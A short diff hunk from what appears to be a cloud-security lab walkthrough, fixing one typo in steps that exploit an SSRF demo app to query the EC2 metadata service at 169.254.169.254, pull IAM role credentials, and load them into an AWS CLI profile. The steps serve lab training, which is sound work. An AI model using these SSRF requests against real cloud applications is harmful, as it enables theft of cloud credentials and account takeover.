@@ -270,7 +270,7 @@ Result is the portion of a page called "sethsec's SSRF demo"
 `http://<publicURL/?url=http://169.254.169.254/latest/meta-data`   
 9. What a helpful app, attempt discover any security-credentials which may be accessible    
 `http://<publicURL/?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/`   
-10. Navigate to the resuting role name     
+10. Navigate to the resulting role name     
 `http://<publicURL/?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>`
 11. Document the new credentials and create a new AWS CLI profile     
 `aws configure --profile cg`  
